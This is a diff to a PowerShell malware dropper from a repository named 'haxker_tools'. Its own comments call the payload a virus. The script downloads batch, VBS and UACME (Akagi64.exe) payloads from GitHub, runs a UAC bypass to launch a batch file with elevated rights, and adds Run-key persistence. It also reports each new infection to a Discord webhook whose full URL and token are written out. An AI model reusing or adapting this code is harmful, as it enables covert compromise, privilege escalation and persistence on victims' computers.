@@ -77,38 +77,64 @@ $vbsPath = "C:\uptm\auto_host.vbs"
 Write-Host "Downloading auto_host.vbs..."
 Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsPath -UseBasicParsing
 
-# 7. Auto Startup Setup
-$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$valueName = "AutoHostScript"
-
-Write-Host "Auto Start Setup..."
-
-New-ItemProperty -Path $registryPath -Name $valueName -Value "wscript.exe `"$vbsPath`"" -PropertyType String -Force
-# or
-# reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AutoHostScript" /t REG_SZ /d "wscript.exe \`"$vbsPath\`"" /f
-
-# 8. Download Main Batch
+# 7. Download Main Batch
 $batUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/host_uptm.bat"
 $batPath = "C:\uptm\host_uptm.bat"
 Write-Host "Downloading host_uptm.bat..."
 Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing
 
-# 9. Download Automatic restart File
+# 8. Download Automatic restart File
 $listbatUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/list.bat"
 $listbatPath = "C:\uptm\list.bat"
 Write-Host "Downloading list.bat..."
 Invoke-WebRequest -Uri $listbatUrl -OutFile $listbatPath -UseBasicParsing
 
-# 10. Download Update Virus Batch
+# 9. Download Update Virus Batch
 $dbatUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/update.bat"
 $dbatPath = "C:\uptm\update.bat"
 Write-Host "Downloading update.bat..."
 Invoke-WebRequest -Uri $dbatUrl -OutFile $dbatPath -UseBasicParsing
 
+# 10 Download Call VBS Batch
+$d2batUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/tmp.bat"
+$d2batPath = "C:\uptm\tmp.bat"
+Write-Host "Downloading tmp.bat..."
+Invoke-WebRequest -Uri $d2batUrl -OutFile $d2batPath -UseBasicParsing
+
+# 10.5 Download VBS Batch
+$d3batUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/tmp.vbs"
+$d3batPath = "C:\uptm\tmp.vbs"
+Write-Host "Downloading tmp.vbs..."
+Invoke-WebRequest -Uri $d3batUrl -OutFile $d3batPath -UseBasicParsing
+
 # 11. Hint New User
 Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1508834299049148597/34nknYuISCFwshV07VmY88rpk4fXD8pGfZPBZVGFyMax9ckOpjJC07z9mG6czsQAgoBA" -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes((@{embeds=@(@{title="新使用者中病毒";footer=@{text="等待可連接ssh通知"};color=16711680})} | ConvertTo-Json -Depth 5))) -ContentType "application/json; charset=utf-8"
 
-# 12. Start Virus
-wscript.exe "$vbsPath"
+# 11.5 Download UACME
+$UACMEUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/Akagi64.exe"
+$UACMEPath = "C:\uptm\Akagi64.exe"
+Write-Host "Downloading Akagi64.exe..."
+
+try {
+    Invoke-WebRequest -Uri $UACMEUrl -OutFile $UACMEPath -UseBasicParsing -ErrorAction Stop
+    
+    Write-Host "Executing UACME Bypass..."
+    & "C:\uptm\Akagi64.exe" 41 "C:\uptm\tmp.bat"
+    
+    # 【關鍵修正 2】暫停 8 秒，確保高權限 CMD 成功讀取 tmp.bat 後才允許清除它
+    Start-Sleep -Seconds 8
+}
+catch {
+    if (Test-Path $UACMEPath) { Remove-Item $UACMEPath -Force }
+    
+    # Hint no Administrator
+    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1508834299049148597/34nknYuISCFwshV07VmY88rpk4fXD8pGfZPBZVGFyMax9ckOpjJC07z9mG6czsQAgoBA" -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes((@{embeds=@(@{title="無法下載UACME並以管理員啟動";footer=@{text="仍會以普通身分繼續操作"};color=16711680})} | ConvertTo-Json -Depth 5))) -ContentType "application/json; charset=utf-8"
+
+    New-ItemProperty -Path $registryPath -Name $valueName -Value "wscript.exe `"$vbsPath`"" -PropertyType String -Force
+}
+
+# 12. Delete Temp File (改用 PowerShell 原生安全刪除)
+if (Test-Path "C:\uptm\tmp.bat") { Remove-Item "C:\uptm\tmp.bat" -Force }
+if (Test-Path "C:\uptm\tmp.vbs") { Remove-Item "C:\uptm\tmp.vbs" -Force }
 
 Write-Host "Deployment completed successfully."
